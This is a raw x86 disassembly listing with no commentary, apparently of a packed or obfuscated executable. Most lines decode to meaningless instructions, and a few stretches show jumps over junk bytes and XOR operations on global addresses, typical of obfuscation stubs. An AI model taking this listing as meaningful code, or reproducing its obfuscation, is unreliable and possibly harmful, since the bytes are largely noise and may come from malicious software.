  40190a:	shl    BYTE PTR [edi-0x5a],0x57
  40190e:	jecxz  0x40195a
  401910:	shl    dl,1
  401912:	xor    ah,0xe5
  401915:	fsub   st,st(4)
  401917:	or     BYTE PTR [ecx+0x26],cl
  40191a:	xor    al,ch
  40191c:	inc    eax
  40191d:	or     DWORD PTR [edx-0x77],ebx
  401920:	shl    BYTE PTR [eax],cl
  401922:	outs   dx,BYTE PTR ds:[esi]
  401923:	pusha  
  401924:	or     ah,BYTE PTR [esi+0x35]
  401927:	mov    esi,0xa32d7b43
  40192c:	xlat   BYTE PTR ds:[ebx]
  40192d:	push   ds
  40192e:	or     ch,BYTE PTR [eax+0x7256b578]
  401934:	jne    0x401906
  401936:	xlat   BYTE PTR ds:[ebx]
  401937:	(bad)  
  401938:	dec    esi
  401939:	test   BYTE PTR [esi],bh
  40193b:	imul   edx,DWORD PTR [ebp+0x2101f2c2],0x54b4c2db
  401945:	xor    ebp,DWORD PTR [ecx+edi*2]
  401948:	sbb    ch,ch
  40194a:	and    al,BYTE PTR [edi+0x45214655]
  401950:	mov    eax,0x6632a680
  401955:	mov    ebp,0x1e2441e2
  40195a:	pop    ebx
  40195b:	jo     0x401962
  40195d:	jle    0x401967
  40195f:	add    bh,BYTE PTR [edi]
  401961:	in     al,dx
  401962:	mov    bl,0xee
  401964:	lea    esi,[edx]
  401966:	not    BYTE PTR [esi+0x0]
  401969:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40196b:	sahf   
  40196c:	scas   al,BYTE PTR es:[edi]
  40196d:	push   edx
  40196e:	mov    al,0xf8
  401970:	mov    bl,BYTE PTR [eax+ebp*1+0x4c]
  401974:	mov    bl,cl
  401976:	test   eax,0x91c36fb3
  40197b:	test   al,0xdf
  40197d:	nop
  40197e:	sbb    DWORD PTR [esp+edx*1],ebp
  401981:	or     bh,bl
  401983:	repnz mov eax,ds:0x726bba1d
  401989:	mov    edx,0x384939de
  40198f:	xor    BYTE PTR [edx-0x7d],bh
  401992:	mov    BYTE PTR [eax-0x544a83d],dl
  401998:	sbb    ch,BYTE PTR [eax+edx*2]
  40199b:	xlat   BYTE PTR ds:[ebx]
  40199c:	mov    ecx,0x1f4d5d0e
  4019a1:	pmulhuw mm7,QWORD PTR [ecx]
  4019a4:	push   ecx
  4019a5:	sbb    DWORD PTR es:[ebx],ecx
  4019a8:	cmp    ch,dl
  4019aa:	sbb    esp,ebp
  4019ac:	mov    cl,0x5c
  4019ae:	cwde   
  4019af:	xor    eax,edx
  4019b1:	cmp    eax,0x8cb40b7d
  4019b6:	je     0x4019d9
  4019bc:	mov    eax,DWORD PTR [ebp-0x10]
  4019bf:	add    DWORD PTR [eax],0x7403501
  4019c5:	jmp    0x4019d9
  4019ca:	mov    eax,DWORD PTR [ebp-0x1c]
  4019cd:	cmp    DWORD PTR [eax],0xf89f2da9
  4019d3:	jne    0x4019f4
  4019d9:	mov    eax,DWORD PTR [ebp-0x8]
  4019dc:	xor    eax,ecx
  4019de:	add    eax,esi
  4019e0:	test   eax,eax
  4019e2:	jne    0x4019f4
  4019e8:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  4019ef:	jmp    0x401169
  4019f4:	pop    ebx
  4019f5:	pop    edi
  4019f6:	pop    esi
  4019f7:	leave  
  4019f8:	ret    0x4
  4019fb:	push   ebp
  4019fc:	mov    ebp,esp
  4019fe:	sub    esp,0x18
  401a01:	leave  
  401a02:	ret    0x4
  401a05:	push   ebp
  401a06:	mov    ebp,esp
  401a08:	jmp    0x401dbe
  401a0d:	addr16 es out dx,eax
  401a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a11:	ins    DWORD PTR es:[edi],dx
  401a12:	jne    0x401a89
  401a14:	out    0xa4,al
  401a16:	cmp    ebp,DWORD PTR [ebx+0x60]
  401a19:	daa    
  401a1a:	loope  0x401a68
  401a1c:	pop    esi
  401a1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a1e:	jnp    0x401a90
  401a20:	jo     0x4019b9
  401a22:	jge    0x401a94
  401a24:	jo     0x401a10
  401a26:	xchg   ebx,eax
  401a27:	xchg   esi,eax
  401a28:	push   cs
  401a29:	arpl   WORD PTR [ebx-0x790ccd57],ax
  401a2f:	lods   al,BYTE PTR ds:[esi]
  401a30:	bound  esi,QWORD PTR [ebp+0x31b4cf36]
  401a36:	push   0x37e8ba38
  401a3b:	(bad)  
  401a3c:	and    al,0x5b
  401a3e:	aaa    
  401a3f:	stos   DWORD PTR es:[edi],eax
  401a40:	xchg   edi,eax
  401a41:	inc    ebx
  401a42:	iret   
  401a43:	in     eax,0x21
  401a45:	sbb    DWORD PTR [eax-0x3e3784a4],edx
  401a4b:	out    0xae,eax
  401a4d:	imul   edi,eax,0xadf40044
  401a53:	in     al,dx
  401a54:	mov    esp,0x2f46c3b0
  401a59:	adc    BYTE PTR [ecx-0x36],0x6f
  401a5d:	pop    eax
  401a5e:	cmp    ch,BYTE PTR [ebp-0x3f]
  401a61:	pusha  
  401a62:	jno    0x401a6d
  401a64:	xor    eax,0x6671f585
  401a69:	jp     0x401ade
  401a6b:	pop    ebp
  401a6c:	cli    
  401a6d:	mov    cs,WORD PTR [ecx-0x1cc08a4c]
  401a73:	imul   edx,DWORD PTR [esi-0x45],0x65b04b55
  401a7a:	repnz retf 0xbec4
  401a7e:	pop    ss
  401a7f:	in     eax,dx
  401a80:	adc    bl,BYTE PTR [ebx-0x5df467c8]
  401a86:	add    dh,BYTE PTR [edx]
  401a88:	inc    edx
  401a89:	xchg   edi,eax
  401a8a:	sbb    bh,BYTE PTR [ebp+0x74f3d365]
  401a90:	cli    
  401a91:	sti    
  401a92:	dec    edi
  401a93:	dec    ebx
  401a94:	ret    0x27c0
  401a97:	hlt    
  401a98:	imul   esi,DWORD PTR [ecx-0x6b8af541],0xd929583e
  401aa2:	push   edx
  401aa3:	(bad)  
  401aa4:	scas   al,BYTE PTR es:[edi]
  401aa5:	(bad)  
  401aa6:	aam    0x85
  401aa8:	and    al,0x7c
  401aaa:	popa   
  401aab:	sub    cl,BYTE PTR [ecx+eiz*1+0xc06159b]
  401ab2:	(bad)  
  401ab3:	test   dl,0x43
  401ab6:	loopne 0x401a3f
  401ab8:	mov    bh,BYTE PTR [edi]
  401aba:	and    al,0x31
  401abc:	dec    ebp
  401abd:	xor    edi,DWORD PTR [edx+0x63895d39]
  401ac3:	or     ecx,DWORD PTR [edi]
  401ac5:	mov    cl,0x4b
  401ac7:	cmp    bl,dh
  401ac9:	push   ebx
  401aca:	lods   al,BYTE PTR ds:[esi]
  401acb:	jbe    0x401a50
  401acd:	out    dx,al
  401ace:	pop    esi
  401acf:	mov    ecx,0x2665a177
  401ad4:	int    0xbb
  401ad6:	(bad)  
  401ad7:	outs   dx,DWORD PTR ds:[esi]
  401ad8:	(bad)  
  401ad9:	cmp    DWORD PTR [ebp-0x24],esp
  401adc:	es arpl bp,ax
  401adf:	or     ch,BYTE PTR [edx+0x52fab65c]
  401ae5:	ins    DWORD PTR es:[edi],dx
  401ae6:	push   es
  401ae7:	jmp    0x43d9b109
  401aec:	add    eax,0xab3e6b8a
  401af1:	dec    ebx
  401af2:	jbe    0x401b18
  401af4:	addr16 and al,0x21
  401af7:	pop    edx
  401af8:	push   ecx
  401af9:	adc    al,0x29
  401afb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401afc:	xor    BYTE PTR [esp+eax*2+0x10d12f3d],bl
  401b03:	dec    edx
  401b04:	pop    ecx
  401b05:	dec    eax
  401b06:	dec    eax
  401b07:	pop    es
  401b08:	ret    
  401b09:	clc    
  401b0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b0b:	out    dx,eax
  401b0c:	add    ebx,DWORD PTR [ecx]
  401b0e:	sub    ecx,esp
  401b10:	mov    eax,ds:0xd04e9ca3
  401b15:	cmp    al,0x9b
  401b17:	mov    eax,0xd6382b75
  401b1c:	dec    edi
  401b1d:	sar    BYTE PTR [ebx],cl
  401b1f:	add    eax,0x400cecf1
  401b24:	jne    0x401adf
  401b26:	push   ebp
  401b27:	int3   
  401b28:	not    BYTE PTR [edi+0x349e452]
  401b2e:	inc    eax
  401b2f:	push   esp
  401b30:	dec    ebp
  401b31:	test   ebx,eax
  401b33:	push   ebp
  401b34:	jbe    0x401b54
  401b36:	mov    ss,WORD PTR [ebx+0x4876afa6]
  401b3c:	push   ds
  401b3d:	cmp    eax,esi
  401b3f:	lahf   
  401b40:	lods   al,BYTE PTR ds:[esi]
  401b41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b42:	jo     0x401b44
  401b44:	jns    0x401b66
  401b46:	dec    ecx
  401b47:	mov    esi,0x61892c72
  401b4c:	push   es
  401b4d:	and    al,0x97
  401b4f:	in     al,dx
  401b50:	sbb    eax,0x101b2b3e
  401b55:	loope  0x401b22
  401b57:	cld    
  401b58:	pop    ecx
  401b59:	cmp    al,0xa
  401b5b:	mov    DWORD PTR [edi-0x380a5529],eax
  401b61:	xor    eax,0x61f2616f
  401b66:	xchg   ebx,eax
  401b67:	xor    dh,bl
  401b69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b6a:	in     al,dx
  401b6b:	enter  0x4e0b,0xb6
  401b6f:	ds and al,0x29
  401b72:	push   ebx
  401b73:	jbe    0x401bd0
  401b75:	(bad)  
  401b76:	dec    ecx
  401b77:	retf   0xdcc
  401b7a:	jmp    0xe7d5:0x694e5f6
  401b81:	mov    ds:0x2dedd6ee,al
  401b86:	xchg   edx,eax
  401b87:	dec    edi
  401b88:	push   eax
  401b89:	into   
  401b8a:	mov    edi,0x1930f3f0
  401b8f:	push   es
  401b90:	xchg   edi,eax
  401b91:	in     al,dx
  401b92:	mov    ds:0x619eb415,eax
  401b97:	dec    esi
  401b98:	(bad)  
  401b99:	jmp    FWORD PTR [edi+0x330ef435]
  401b9f:	lahf   
  401ba0:	mul    BYTE PTR [edi-0x53]
  401ba3:	aad    0x3
  401ba5:	clc    
  401ba6:	jne    0x401c06
  401ba8:	pop    esp
  401ba9:	es stos BYTE PTR es:[edi],al
  401bab:	mov    ds:0xae98b873,eax
  401bb0:	push   es
  401bb1:	mov    DWORD PTR [esi+0x2eed938d],ebp
  401bb7:	outs   dx,DWORD PTR ds:[esi]
  401bb8:	test   BYTE PTR [ecx-0x62],al
  401bbb:	mov    esp,ecx
  401bbd:	in     eax,0xae
  401bbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bc0:	jmp    0xd94a:0xf5100e2c
  401bc7:	pop    edx
  401bc8:	fcom   DWORD PTR [esi-0x22fbbae7]
  401bce:	and    DWORD PTR [edx],0xffffff96
  401bd1:	add    dl,dh
  401bd3:	loope  0x401be5
  401bd5:	(bad)  
  401bd6:	retf   
  401bd7:	push   ss
  401bd8:	rcr    BYTE PTR [edx-0x20],0x17
  401bdc:	rol    DWORD PTR [eax+0x1a],cl
  401bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401be0:	pop    ebp
  401be1:	dec    esp
  401be3:	adc    dh,BYTE PTR [edi-0x1aaf81f4]
  401be9:	pop    eax
  401bea:	dec    ecx
  401beb:	les    ebp,FWORD PTR [esi+0x4f]
  401bee:	push   ss
  401bef:	cdq    
  401bf0:	ins    DWORD PTR es:[edi],dx
  401bf1:	ret    
  401bf2:	push   esi
  401bf3:	cmp    eax,0x49b265fe
  401bf8:	imul   eax,DWORD PTR [edi],0xe36a4881
  401bfe:	(bad)  
  401bff:	pop    edi
  401c00:	clc    
  401c01:	mov    esi,esp
  401c03:	or     dl,BYTE PTR [eax]
  401c05:	xchg   esp,eax
  401c06:	in     al,dx
  401c07:	fst    DWORD PTR [ebx+esi*8]
  401c0a:	dec    ecx
  401c0b:	fild   WORD PTR [eax-0x3a6bca21]
  401c11:	xchg   esi,eax
  401c12:	push   ebp
  401c13:	sub    dh,BYTE PTR [eax+edi*4+0x67fd9620]
  401c1a:	bound  edi,QWORD PTR [ebx+eiz*8]
  401c1d:	test   eax,0x1fe6f
  401c22:	ret    0xc498
  401c25:	loopne 0x401bfc
  401c27:	sbb    eax,0x36ba69d0
  401c2c:	push   ebp
  401c2d:	xchg   ecx,eax
  401c2e:	cmp    edx,ebp
  401c30:	adc    BYTE PTR [edi+0x7ac9960f],dl
  401c36:	and    al,0xf7
  401c38:	icebp  
  401c39:	popf   
  401c3a:	mov    esi,0x9562c702
  401c3f:	fs jl  0x401c27
  401c42:	mov    eax,ds:0x8324d121
  401c47:	(bad)  
  401c49:	ss nop
  401c4b:	sbb    ah,bh
  401c4d:	add    ebp,DWORD PTR [esi-0x26]
  401c50:	rcl    esp,0x79
  401c53:	or     DWORD PTR [esi-0x42a15c79],edi
  401c59:	or     ecx,DWORD PTR [ecx+0x78]
  401c5c:	inc    esi
  401c5d:	xor    DWORD PTR [ecx+0x3ebf33d4],esp
  401c63:	add    eax,0xe2938b16
  401c68:	dec    ebp
  401c69:	(bad)  
  401c6a:	lds    edx,FWORD PTR [edx+0x7d]
  401c6d:	aas    
  401c6e:	repz xchg esi,ecx
  401c71:	icebp  
  401c72:	cmc    
  401c73:	mov    bh,ch
  401c75:	pop    eax
  401c76:	and    BYTE PTR [esi],bh
  401c78:	pop    eax
  401c79:	mov    BYTE PTR [esi],0x3b
  401c7c:	rcl    al,0xec
  401c7f:	push   edx
  401c80:	push   esp
  401c81:	popa   
  401c82:	push   ecx
  401c83:	or     BYTE PTR [esp+ebx*2+0x78],bl
  401c87:	pop    esi
  401c88:	pop    ecx
  401c89:	jne    0x37b40ded
  401c8f:	push   ds
  401c90:	popf   
  401c91:	and    BYTE PTR [ebx-0x77450d71],ch
  401c97:	ja     0x401c82
  401c99:	repz sbb dl,BYTE PTR [eax]
  401c9c:	inc    ebp
  401c9d:	aad    0xb8
  401c9f:	leave  
  401ca0:	fistp  QWORD PTR es:[ebx+0xa]
  401ca4:	or     DWORD PTR [ecx-0x72],ebx
  401ca7:	or     BYTE PTR [edi],dh
  401ca9:	ss and bl,al
  401cac:	mov    ?,WORD PTR [esi]
  401cae:	pop    esi
  401caf:	out    dx,eax
  401cb0:	ja     0x401c96
  401cb2:	popa   
  401cb3:	fnstcw WORD PTR [edx+edi*2]
  401cb6:	ins    BYTE PTR es:[edi],dx
  401cb7:	ins    DWORD PTR es:[edi],dx
  401cb8:	stc    
  401cb9:	imul   ebp,esp,0xf0dc756f
  401cbf:	out    dx,al
  401cc0:	gs jecxz 0x401c57
  401cc3:	fistp  QWORD PTR [edx+ebx*8+0x44df46ac]
  401cca:	test   esi,0x5bfe7c3b
  401cd0:	mov    fs,eax
  401cd2:	push   ss
  401cd3:	cwde   
  401cd4:	mov    edx,0x75c7b570
  401cd9:	add    BYTE PTR [esi-0x6b152ba5],0xb4
  401ce0:	cmp    BYTE PTR [ebx+eax*2-0x64],ah
  401ce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ce5:	retf   0x11ad
  401ce8:	je     0x401d62
  401cea:	or     BYTE PTR [edi+0x16],ch
  401ced:	outs   dx,DWORD PTR ds:[esi]
  401cee:	xchg   BYTE PTR [esi-0x6eb82636],al
  401cf4:	retf   0xe9d2
  401cf7:	je     0x401c82
  401cf9:	imul   ebp,DWORD PTR [esi-0x71],0x68
  401cfd:	pop    edi
  401cfe:	jl     0x401c88
  401d00:	call   0x83e2:0xf48a4838
  401d07:	dec    ebx
  401d08:	dec    eax
  401d09:	pushf  
  401d0a:	push   esi
  401d0b:	ins    BYTE PTR es:[edi],dx
  401d0c:	sahf   
  401d0d:	jge    0x401d03
  401d0f:	inc    edx
  401d10:	lock xchg DWORD PTR cs:[ebx+0x12cc99b5],esp
  401d18:	sbb    al,0xe4
  401d1a:	pop    esp
  401d1b:	cs test al,0xc
  401d1e:	out    0x9b,al
  401d20:	dec    ebp
  401d21:	xlat   BYTE PTR ds:[ebx]
  401d22:	or     edx,DWORD PTR [ecx+ecx*1-0x26]
  401d26:	push   eax
  401d27:	xor    bh,BYTE PTR [ebx]
  401d29:	ret    
  401d2a:	dec    esi
  401d2b:	jnp    0x401cbf
  401d2d:	mov    cl,0x91
  401d2f:	je     0x401d66
  401d31:	or     DWORD PTR [esi+edi*1-0x987eaf4],ebx
  401d38:	inc    edi
  401d39:	hlt    
  401d3a:	dec    esp
  401d3c:	add    ecx,0x3a
  401d3f:	in     al,dx
  401d40:	jp     0x401d81
  401d42:	gs sbb eax,ebx
  401d45:	test   eax,0x1fa86bba
  401d4a:	push   ds
  401d4b:	and    eax,0x32369e36
  401d50:	ins    DWORD PTR es:[edi],dx
  401d51:	(bad)  
  401d52:	mul    DWORD PTR [ebx+0x3]
  401d55:	add    eax,0x115f11b6
  401d5a:	popf   
  401d5b:	leave  
  401d5c:	(bad)  
  401d5d:	retf   0xb958
  401d60:	mov    ds:0xe5abaddb,al
  401d65:	jmp    0x401d45
  401d67:	(bad)  
  401d68:	jno    0x401d27
  401d6a:	mov    ax,0x3ec8
  401d6e:	cld    
  401d6f:	mov    dl,0x5f
  401d71:	in     eax,0x23
  401d73:	mov    dl,BYTE PTR [edi+edx*4+0x18b0ddf5]
  401d7a:	out    dx,al
  401d7b:	pop    es
  401d7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d7d:	ror    bl,1
  401d7f:	mov    bl,0x63
  401d81:	mov    bh,0xfd
  401d83:	add    BYTE PTR ds:0x6babcfd4,cl
  401d89:	test   DWORD PTR [ebx],esp
  401d8b:	fdiv   QWORD PTR [ecx+0x3ce49a99]
  401d91:	fwait
  401d92:	test   eax,0x5e08aaf9
  401d97:	jne    0x401d31
  401d99:	mov    esi,0x7fda5e14
  401d9e:	je     0x401e14
  401da0:	es test al,0x0
  401da3:	(bad)  
  401da5:	lods   eax,DWORD PTR ds:[esi]
  401da6:	icebp  
  401da7:	mov    WORD PTR [esi+0x5c99596e],fs
  401dad:	aaa    
  401dae:	push   edx
  401daf:	out    dx,eax
  401db0:	(bad)  
  401db1:	fisttp WORD PTR [edx+0x32308a51]
  401db7:	fcomp  QWORD PTR [edx]
  401db9:	(bad)  
  401dba:	push   0x12
  401dbc:	pusha  
  401dbd:	out    dx,eax
  401dbe:	push   ecx
  401dbf:	push   ecx
  401dc0:	xor    DWORD PTR ds:0x434366,ebx
  401dc6:	mov    eax,0xf89c8531
  401dcb:	sub    DWORD PTR ds:0x432dde,ebx
  401dd1:	mov    DWORD PTR [ebp-0x8],eax
  401dd4:	sbb    DWORD PTR ds:0x432dce,0x43436e
  401dde:	jmp    0x402194
  401de3:	add    ebx,DWORD PTR [ebx-0x2398ef41]
  401de9:	arpl   WORD PTR [ebx-0x6e9fb147],sp
  401def:	mov    ds,WORD PTR [esi]
  401df1:	dec    BYTE PTR [ebx+edi*1+0x7]
  401df5:	jo     0x401e67
  401df7:	xchg   edi,eax
  401df8:	jge    0x401e6a
  401dfa:	jo     0x401dd6
  401dfc:	mov    al,0x1
  401dfe:	cld    
  401dff:	pushf  
  401e00:	aam    0xe5
  401e02:	inc    eax
  401e03:	inc    DWORD PTR [edi]
  401e05:	jge    0x401e7a
  401e07:	pop    esi
  401e08:	mov    esi,0xaffe523a
  401e0d:	stc    
  401e0e:	data16 scas al,BYTE PTR es:[edi]
  401e10:	jle    0x401e5b
  401e12:	xor    cl,bl
  401e14:	pop    ds
  401e15:	or     eax,0x6fc6fa56
  401e1a:	pop    esp
  401e1b:	sahf   
  401e1c:	mov    bh,0xf8
  401e1e:	jbe    0x401e6d
  401e20:	mov    al,ds:0x7a610f47
  401e25:	jnp    0x401da7
  401e27:	jbe    0x401e26
  401e29:	sub    edi,DWORD PTR [eax]
  401e2b:	pop    esi
  401e2c:	mov    BYTE PTR [eax],bh
  401e2e:	cmp    eax,0xea717384
  401e33:	ins    BYTE PTR es:[edi],dx
  401e34:	outs   dx,BYTE PTR ds:[esi]
  401e35:	mov    ah,BYTE PTR [eax]
  401e37:	icebp  
  401e38:	stos   BYTE PTR es:[edi],al
  401e39:	(bad)  
  401e3a:	ds mov ah,0x3b
  401e3d:	ret    0x139e
  401e40:	lods   eax,DWORD PTR ds:[esi]
  401e41:	test   BYTE PTR [esi+0x98bd68d],bh
  401e47:	mov    ch,al
  401e49:	and    bh,BYTE PTR [eax+0x389b6c6c]
  401e4f:	arpl   WORD PTR [eax+0x5b],si
  401e52:	outs   dx,DWORD PTR ds:[esi]
  401e53:	and    ebp,DWORD PTR [esi-0x3af547c9]
  401e59:	out    dx,al
  401e5a:	cmp    ch,BYTE PTR [ebx+0x5387cb2c]
  401e60:	adc    bl,dh
  401e62:	bound  edi,QWORD PTR [edi]
  401e64:	ss (bad) 
  401e66:	cld    
  401e67:	mov    esp,edi
  401e69:	fldenv [esi+edx*2-0x7f]
  401e6d:	add    ebp,DWORD PTR [eax+0x60451ca2]
  401e73:	scas   al,BYTE PTR es:[edi]
  401e74:	xor    bl,BYTE PTR [ebx-0x1e]
  401e77:	or     al,0x6b
  401e79:	and    ch,dl
  401e7b:	push   0x89c6bab0
  401e80:	ja     0x401e7a
  401e82:	dec    eax
  401e83:	xbegin 0x869f071a
  401e89:	inc    edi
  401e8a:	sub    eax,0xc0da2cfd
  401e8f:	fcmovnbe st,st(7)
  401e91:	jmp    0x12a0:0xa16e9b0
  401e98:	xchg   dl,dl
  401e9a:	mov    esi,0x90151fa7
  401e9f:	fmul   st,st(7)
  401ea1:	mov    ds:0x39e48fdd,eax
  401ea6:	fisub  DWORD PTR [edx-0x64126058]
  401eac:	je     0x401ea6
  401eae:	test   eax,0x50e44242
  401eb3:	arpl   dx,dx
  401eb5:	inc    ecx
  401eb6:	or     esi,DWORD PTR [edx+0x8]
  401eb9:	in     al,0x96
  401ebb:	je     0x401eb5
  401ebd:	test   DWORD PTR [ecx],edx
  401ebf:	rcl    BYTE PTR [eax],0xdd
  401ec2:	xlat   BYTE PTR ds:[ebx]
  401ec3:	in     eax,dx
  401ec4:	cld    
  401ec5:	inc    ebp
  401ec6:	or     dh,BYTE PTR [esi]
  401ec8:	push   es
  401ec9:	test   BYTE PTR [eax-0x3a0a5219],ah
  401ecf:	adc    edi,eax
  401ed1:	sub    DWORD PTR [ecx],ebp
  401ed3:	cmp    bh,al
  401ed5:	test   al,0x4e
  401ed7:	adc    al,0x43
  401ed9:	inc    ecx
  401eda:	pop    esp
  401edb:	shl    BYTE PTR [ebx-0x53f1d15f],0xfe
  401ee2:	pop    ecx
  401ee3:	inc    edi
  401ee4:	push   ebp
  401ee5:	push   0x5f
  401ee7:	das    
  401ee8:	xchg   edx,eax
  401ee9:	and    eax,0x3059eed4
  401eee:	fld    QWORD PTR [esi+ebx*1+0x3031c8c]
  401ef5:	sti    
  401ef6:	or     ecx,ecx
  401ef8:	push   eax
  401ef9:	inc    esp
  401efa:	int3   
  401efb:	xchg   ecx,eax
  401efc:	adc    DWORD PTR [esi-0x6451c711],0xfffffff3
  401f03:	adc    BYTE PTR [ecx],0xee
  401f06:	mov    al,ds:0x815ce9ec
  401f0b:	out    dx,al
  401f0c:	call   0xf446:0xf1361eb1
  401f13:	cli    
  401f14:	inc    ebp
  401f15:	std    
  401f16:	(bad)  
  401f17:	sti    
  401f18:	stos   BYTE PTR es:[edi],al
  401f19:	sub    DWORD PTR [edx+0x64ba6fd3],0x7d
  401f20:	into   
  401f21:	mov    al,0xac
  401f23:	add    cl,BYTE PTR [eax]
  401f25:	sbb    eax,DWORD PTR [ebx+0x39781723]
  401f2b:	xchg   ah,cl
  401f2d:	nop
  401f2e:	retf   
  401f2f:	jmp    0xa074:0x2d066313
  401f36:	add    DWORD PTR [eax],0xffffffa7
  401f39:	sub    DWORD PTR [ebp+esi*1+0x3c],esi
  401f3d:	aam    0xe9
  401f3f:	adc    bl,BYTE PTR [eax+ebx*8]
  401f42:	xchg   ebx,eax
  401f43:	mov    dh,BYTE PTR [ebx]
  401f45:	(bad)  
  401f46:	mov    eax,0xc28bc05c
  401f4b:	leave  
  401f4c:	leave  
  401f4d:	jne    0x401f33
  401f4f:	pop    ebx
  401f50:	shl    DWORD PTR [edi+0x3ff8b89c],0x97
  401f57:	inc    eax
  401f58:	cmp    bl,BYTE PTR [edi-0x2531677]
  401f5e:	outs   dx,BYTE PTR ds:[esi]
  401f5f:	dec    ecx
  401f60:	iret   
  401f61:	or     DWORD PTR [esi+0x55],ecx
  401f64:	test   DWORD PTR [esi],esi
  401f66:	es out 0x67,eax
  401f69:	leave  
  401f6a:	int    0x98
  401f6c:	pop    eax
  401f6d:	cmp    eax,0x26056606
  401f72:	mov    WORD PTR [ebx-0x7],gs
  401f75:	mov    dh,0xb8
  401f77:	mov    ds:0xc6aa9327,eax
  401f7c:	mov    bh,BYTE PTR [edi]
  401f7e:	add    esp,DWORD PTR [ecx+0x470fe054]
  401f84:	test   DWORD PTR ss:[edx-0x7a],edi
  401f88:	or     eax,0xbf5afd77
  401f8d:	xchg   ebx,eax
  401f8e:	daa    
  401f8f:	mov    eax,0xb64b42df
  401f94:	jmp    0x3c49fa9d
  401f99:	or     BYTE PTR [ebx+ebx*1],bl
  401f9c:	dec    edi
  401f9d:	daa    
  401f9e:	mov    esi,0xc0cf68a7
  401fa3:	cld    
  401fa4:	sar    BYTE PTR [ecx-0x13],0xa0
  401fa8:	loope  0x401f8b
  401faa:	mov    esp,0x42bc87a2
  401faf:	push   0x76
  401fb1:	fistp  QWORD PTR [ebp-0x7800647f]
  401fb7:	pop    eax
  401fb8:	dec    edi
  401fb9:	mov    ah,0xe8
  401fbb:	xchg   ecx,eax
  401fbc:	jge    0x401fbc
  401fbe:	mov    ebp,0xdca4f9c7
  401fc3:	xor    ebx,ebp
  401fc5:	push   esi
  401fc6:	pause  
  401fc8:	in     al,dx
  401fc9:	push   0xfffffff8
  401fcb:	js     0x40200b
  401fcd:	mov    ch,0x11
  401fcf:	jecxz  0x40202a
  401fd1:	xchg   edx,eax
  401fd2:	es push 0xaf4ef2d0
  401fd8:	and    al,0xec
  401fda:	push   0xffffff93
  401fdc:	in     al,0xd
  401fde:	imul   esi,DWORD PTR [edi],0x47
  401fe1:	ins    BYTE PTR es:[edi],dx
  401fe2:	mul    DWORD PTR [eax+0x15]
  401fe5:	cmp    esp,DWORD PTR [edx]
  401fe7:	retf   
  401fe8:	lea    ecx,[ebx]
  401fea:	dec    ebx
  401feb:	sahf   
  401fec:	lds    ebx,FWORD PTR [ebp-0x86347c0]
  401ff2:	cmc    
  401ff3:	push   0xffffffa4
  401ff5:	adc    DWORD PTR [eax],edi
  401ff7:	xor    ebx,DWORD PTR [ebp+0x1]
  401ffa:	push   ebp
  401ffb:	pop    ebp
  401ffc:	aas    
  401ffd:	cmp    DWORD PTR ds:0xef5fda93,esp
  402003:	add    ch,bh
  402005:	(bad)  
  402006:	into   
  402007:	xchg   esi,eax
  402008:	or     esp,ebp
  40200a:	mov    dh,0x54
  40200c:	cld    
  40200d:	xlat   BYTE PTR ds:[ebx]
  40200e:	sbb    DWORD PTR [edx],eax
  402010:	or     edi,DWORD PTR [edx+0x1e9ea036]
  402016:	call   0xff3870f
  40201b:	xchg   esp,eax
  40201c:	mov    bh,0xe
  40201e:	jg     0x401fba
  402020:	mov    dh,BYTE PTR [edi+ebp*8+0x13cd7a3c]
  402027:	mov    BYTE PTR [edx+0x3],ah
  40202a:	pop    esp
  40202b:	cmp    eax,0x62164e16
  402030:	test   BYTE PTR [ebx+edi*8],ah
  402033:	or     al,0xad
  402035:	loopne 0x401fbf
  402037:	xchg   ebx,eax
  402038:	pop    ecx
  402039:	bound  esi,QWORD PTR [esi-0x43]
  40203c:	cmp    esp,ebx
  40203e:	xchg   esi,eax
  40203f:	(bad)  
  402040:	cwde   
  402041:	sub    al,0x56
  402043:	(bad)  
  402044:	sti    
  402045:	push   ds
  402046:	in     al,dx
  402047:	repnz arpl WORD PTR [eax],bp
  40204a:	push   ebx
  40204b:	into   
  40204c:	mov    eax,ds:0x7181797d
  402051:	adc    BYTE PTR [esi+esi*8+0x5e6970f],bl
  402058:	pop    ebx
  402059:	mov    WORD PTR [ebx-0x4b4ec789],gs
  40205f:	out    dx,al
  402060:	mov    dl,0x54
  402062:	mov    ebx,0x3b1b6d59
  402067:	jg     0x4020d5
  402069:	inc    ebx
  40206a:	adc    al,0x6d
  40206c:	xchg   BYTE PTR [edx-0x240c654b],dl
  402072:	or     al,0x99
  402074:	inc    ebp
  402075:	fxtract 
  402077:	and    esi,DWORD PTR [ebx]
  402079:	dec    ecx
  40207a:	fild   QWORD PTR [ebx]
  40207c:	adc    bl,BYTE PTR [ebp-0x5528417a]
  402082:	dec    eax
  402083:	mov    dl,0x94
  402085:	cmp    eax,0xf64e8410
  40208a:	fs xor eax,0x8ffeab2b
  402090:	outs   dx,BYTE PTR ds:[esi]
  402091:	inc    eax
  402092:	or     BYTE PTR [ecx-0x39ef823c],0x6b
  402099:	sub    al,0xa
  40209b:	push   edx
  40209c:	xchg   edi,eax
  40209d:	inc    esi
  40209e:	adc    al,0x73
  4020a0:	jle    0x402104
  4020a2:	loop   0x40211b
  4020a4:	inc    ebx
  4020a5:	xor    DWORD PTR ds:0x250777fa,ebx
  4020ab:	adc    cl,BYTE PTR [eax+0x72]
  4020ae:	inc    ebx
  4020af:	jle    0x8c2bb1d
  4020b5:	or     BYTE PTR [edi+0x34bb0758],cl
  4020bb:	mov    ds,WORD PTR [ebp+0x780afefb]
  4020c1:	lods   al,BYTE PTR ds:[esi]
  4020c2:	push   ebx
  4020c3:	and    ah,dl
  4020c5:	jo     0x402111
  4020c7:	adc    BYTE PTR [ecx],dl
  4020c9:	repnz mov ebp,0xa05648f3
  4020cf:	mov    dl,0xa2
